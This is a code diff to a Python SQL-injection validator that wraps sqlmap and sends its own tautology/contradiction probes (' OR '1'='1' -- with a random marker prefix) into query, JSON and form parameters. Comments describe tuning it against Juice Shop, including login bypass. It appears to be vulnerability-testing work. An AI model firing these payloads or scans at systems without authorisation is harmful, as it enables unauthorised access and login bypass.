@@ -3,6 +3,7 @@ import asyncio
 import json as _json
 import os
 import re
+import secrets
 import tempfile
 import subprocess
 from pathlib import Path
@@ -173,8 +174,8 @@ def _responses_differ(resp_a: httpx.Response, resp_b: httpx.Response) -> bool:
 # Error-based signal, complementary to the boolean-blind differential
 # above -- found necessary live, against a real target: Juice Shop's
 # product search (`GET /rest/products/search?q=`) wraps the parameter in
-# a LIKE '%...%' clause, where an OR-based tautology/contradiction pair
-# is not actually a true/false differential at all (the unconditional
+# a LIKE '%...%' clause, where an unprefixed OR-based tautology/contradiction
+# pair was not a true/false differential at all (the unconditional
 # `LIKE '%'` half of the OR already matches everything, so both the
 # "true" and "false" injected predicates return identical results -- a
 # real, confirmed injection point that the boolean-blind check alone
@@ -571,6 +572,14 @@ class SqlmapValidator(Validator):
                 for code in _AUTH_REJECTION_CODES:
                     if code not in ignore_codes:
                         ignore_codes.append(code)
+                if exchange.response_status is not None and 200 <= exchange.response_status < 300:
+                    # live-v8: a successful login answers with a per-request token, so
+                    # two identical requests differ in content and sqlmap's stability
+                    # check passes or fails by timing. Failed, it compares page content
+                    # and never reads the 2xx-vs-401 flip (v8, 191 requests, nothing
+                    # found); passed, it picks --code itself (v7). Naming the success
+                    # status makes the flip the comparison either way.
+                    cmd += ["--code", str(exchange.response_status)]
             if ignore_codes:
                 cmd += ["--ignore-code", ",".join(ignore_codes)]
 
@@ -834,8 +843,12 @@ class SqlmapValidator(Validator):
         for each sends exactly two requests, identical to the original
         exchange except for that one parameter's value:
 
-          A (tautology):  ' OR '1'='1' --   -- same predicate either way
-          B (contradiction): ' OR '1'='2' -- -- same syntax, false predicate
+          A (tautology):  <marker>' OR '1'='1' --   -- true whatever the field holds
+          B (contradiction): <marker>' OR '1'='2' -- -- same syntax, false predicate
+
+        <marker> is a fresh random token shared by A and B. Without it B reduces
+        to `field = ''`, which a stored empty value matches: live-v8's target
+        held an account registered with an empty email, so both probes logged in.
 
         Confirmation is a response differential between A and B: a status-
         code difference is always meaningful; otherwise (most non-auth
@@ -899,18 +912,20 @@ class SqlmapValidator(Validator):
         attempts: list[str] = []
         errors: list[str] = []
         had_clean_comparison = False
+        marker = "zq" + secrets.token_hex(4)
+        true_payload, false_payload = f"{marker}' OR '1'='1' -- ", f"{marker}' OR '1'='2' -- "
 
         for location, param in candidates:
             if location == "query":
-                url_a = _mutate_query_param(exchange.url, param, "' OR '1'='1' -- ")
-                url_b = _mutate_query_param(exchange.url, param, "' OR '1'='2' -- ")
+                url_a = _mutate_query_param(exchange.url, param, true_payload)
+                url_b = _mutate_query_param(exchange.url, param, false_payload)
                 if url_a is None or url_b is None:
                     continue
                 target_a, target_b, body_a, body_b = url_a, url_b, body, body
             else:
                 mutate = _mutate_json_param if body_kind == "json" else _mutate_form_param
-                body_a = mutate(body, param, "' OR '1'='1' -- ")
-                body_b = mutate(body, param, "' OR '1'='2' -- ")
+                body_a = mutate(body, param, true_payload)
+                body_b = mutate(body, param, false_payload)
                 if body_a is None or body_b is None:
                     continue
                 target_a, target_b = exchange.url, exchange.url
@@ -984,8 +999,8 @@ class SqlmapValidator(Validator):
             had_clean_comparison = True
 
             evidence = (
-                f"{label}: tautology (' OR '1'='1' -- ) -> HTTP {resp_a.status_code} "
-                f"({len(resp_a.content)}b); contradiction (' OR '1'='2' -- ) -> "
+                f"{label}: tautology ({true_payload}) -> HTTP {resp_a.status_code} "
+                f"({len(resp_a.content)}b); contradiction ({false_payload}) -> "
                 f"HTTP {resp_b.status_code} ({len(resp_b.content)}b)"
             )
             both_db_errors = _looks_like_db_error(resp_a) and _looks_like_db_error(resp_b)
